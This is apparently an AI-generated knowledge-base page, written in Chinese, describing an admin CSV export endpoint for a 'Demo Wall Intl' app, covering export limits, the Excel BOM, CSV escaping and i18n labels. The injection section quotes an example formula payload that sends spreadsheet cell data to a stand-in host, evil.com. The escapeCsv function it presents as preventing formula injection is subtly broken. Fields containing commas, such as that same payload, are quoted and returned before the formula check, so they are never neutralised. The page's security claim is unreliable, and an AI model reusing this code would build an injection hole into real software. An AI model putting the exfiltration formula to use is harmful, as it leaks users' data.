---
type: Concept
title: CSV 导出功能
description: intl版新增管理员CSV导出端点/api/console/works/export，支持选中导出和筛选条件导出，硬上限5000条防止内存溢出，输出UTF-8 BOM兼容Excel，escapeCsv防公式注入，包含i18n标签解析。
tags: [demo-wall, intl, csv, export, excel, admin, security]
generated: { by: "reference_agent/trae-cn", at: 2026-04-22T00:00:00+08:00 }
verified: { by: "process:grep-verification", at: 2026-04-22T00:00:00+08:00 }
status: stable
stale_after: 2026-10-22
sources:
  - id: src
    resource: /references/demo-wall-intl-source.md
    title: Demo Wall Intl 源码信源索引
---

## 功能定位

CSV 导出是国际版新增的管理员功能，允许运营人员从管理后台导出作品数据为 CSV 文件，用于离线分析、报表制作、数据备份等场景。中文版无此功能（国内运营通常直接查询数据库或使用内部 BI 工具，国际版运营人员可能没有数据库访问权限）。

## API 端点

```
GET /api/console/works/export
```

### 请求参数

| 参数 | 类型 | 说明 |
|------|------|------|
| `ids` | string（可选） | 逗号分隔的作品ID列表，用于选中导出 |
| 筛选参数 | various（可选） | 与作品列表 API 相同的筛选条件（keyword/status/category/honor/country/city 等） |

当提供 `ids` 参数时，导出指定ID的作品；否则按筛选条件导出。

### 响应

- Content-Type: `text/csv; charset=utf-8`
- Content-Disposition: `attachment; filename="works_export_YYYYMMDD_HHMMSS.csv"`
- Body: CSV 文本内容

### 权限

仅管理员（admin/root 角色）可访问。

## 安全措施

### 5000 条硬上限

```typescript
const MAX_EXPORT_COUNT = 5000;

const where = buildWhereClause(searchParams);
const totalCount = await prisma.workBase.count({ where });
if (totalCount > MAX_EXPORT_COUNT) {
  // 返回错误或截断为5000条
}
```

5000条上限的原因：
1. **内存限制**：Node.js 单进程有内存限制，全量加载数万条记录可能导致 OOM
2. **Vercel Serverless Function 超时**：Hobby 计划 10s、Pro 计划 60s，大数据查询+序列化可能超时
3. **网络传输**：超大文件下载体验差
4. **安全**：防止恶意用户通过导出API拖库

> 如需导出更大数据集，应改为异步导出模式——后台任务生成CSV写入COS，返回下载链接。

### UTF-8 BOM

```typescript
const BOM = '\uFEFF';
const csvContent = BOM + headerRow + '\n' + dataRows.join('\n');
```

不带 BOM 的 UTF-8 CSV 在 Windows Excel 中会乱码（Excel 默认用系统编码 GBK/ANSI 打开）。BOM（Byte Order Mark，`\uFEFF`）是 UTF-8 编码的标识字符，告诉 Excel 使用 UTF-8 解码。

- Windows Excel：需要 BOM 才能正确显示中文/日文/印尼文/越南文
- Mac Excel / Google Sheets / WPS：不需要 BOM 也能正确识别，但有 BOM 无负面影响

### escapeCsv 防注入

```typescript
function escapeCsv(value: unknown): string {
  const str = String(value ?? '');
  // 双引号转义（双写）
  const escaped = str.replace(/"/g, '""');
  // 如果包含逗号、引号、换行，用双引号包裹
  if (/[",\n\r]/.test(escaped)) {
    return `"${escaped}"`;
  }
  // 防公式注入：以 = + - @ 开头的值前置单引号
  if (/^[=+\-@]/.test(escaped)) {
    return `'${escaped}`;
  }
  return escaped;
}
```

CSV 注入风险：
- Excel 会将以 `=`/`+`/`-`/`@` 开头的单元格内容当作公式执行
- 恶意用户可在作品标题中注入 `=HYPERLINK("http://evil.com/steal?data="&A1,"Click")` 等公式
- escapeCsv 在危险字符前加单引号 `'`，Excel 将其视为文本而非公式

标准 CSV 转义规则：
- 字段值包含逗号（字段分隔符）→ 双引号包裹
- 字段值包含双引号 → 双引号转双写 + 双引号包裹
- 字段值包含换行符（记录分隔符）→ 双引号包裹

## 导出字段

CSV 包含完整的作品字段及 i18n 标签解析：

| 列名 | 来源 | 说明 |
|------|------|------|
| ID | WorkBase.id | BigInt 转为 string |
| 标题 | WorkDetail.title | 作品标题 |
| 描述 | WorkDetail.description | 作品描述（可能被截断） |
| 分类 | SysDictItem.labelI18n | 通过 pickI18nLabel 解析为当前语言标签 |
| 荣誉 | SysDictItem.labelI18n | 同上 |
| 国家 | SysDictItem.labelI18n | 同上 |
| 城市 | SysDictItem.labelI18n | 同上 |
| 作者 | SysUser.username/name | 作者信息 |
| 审核状态 | AUDIT_STATUS_LABEL | 映射为可读标签（如"已通过"/"待审核"/"已拒绝"） |
| 展示状态 | DISPLAY_STATUS_LABEL | 映射为可读标签（如"展示中"/"已隐藏"） |
| 浏览量 | WorkStatistic.viewCount | 统计数据 |
| 点赞数 | WorkStatistic.likeCount | 统计数据 |
| 创建时间 | WorkBase.createdAt | ISO 日期格式 |
| 更新时间 | WorkBase.updatedAt | ISO 日期格式 |

## i18n 标签解析

导出时根据请求的语言参数解析字典标签：

```typescript
function pickI18nLabel(item: { labelI18n: Record<string, string>; name?: string }, lang: string) {
  return item.labelI18n?.[lang] || item.labelI18n?.['en-US'] || item.name || '';
}
```

审核状态和展示状态的映射：

```typescript
const AUDIT_STATUS_LABEL: Record<string, Record<string, string>> = {
  'en-US': { pending: 'Pending', approved: 'Approved', rejected: 'Rejected' },
  'zh-CN': { pending: '待审核', approved: '已通过', rejected: '已拒绝' },
  // ja-JP, id-ID, vi-VN...
};

const DISPLAY_STATUS_LABEL: Record<string, Record<string, string>> = {
  'en-US': { visible: 'Visible', hidden: 'Hidden' },
  'zh-CN': { visible: '展示中', hidden: '已隐藏' },
  // ...
};
```

## 文件名生成

```typescript
const now = new Date();
const timestamp = now.getFullYear().toString() +
  String(now.getMonth() + 1).padStart(2, '0') +
  String(now.getDate()).padStart(2, '0') + '_' +
  String(now.getHours()).padStart(2, '0') +
  String(now.getMinutes()).padStart(2, '0') +
  String(now.getSeconds()).padStart(2, '0');
const filename = `works_export_${timestamp}.csv`;
// → works_export_20260422_143052.csv
```

## 使用场景

1. **运营分析**：导出作品数据做离线统计（分类分布、地域分布、审核通过率等）
2. **数据备份**：定期导出数据做备份
3. **迁移数据**：将数据迁移到其他系统
4. **选中导出**：勾选特定作品导出，用于制作专题报告

## 相关概念

- [Demo Wall Intl 简介](00-introduction.md)
- [GDPR合规审计留存](04-gdpr-audit-retention.md)
- [CSV数据导出示例](../examples/csv-export-usage.md)
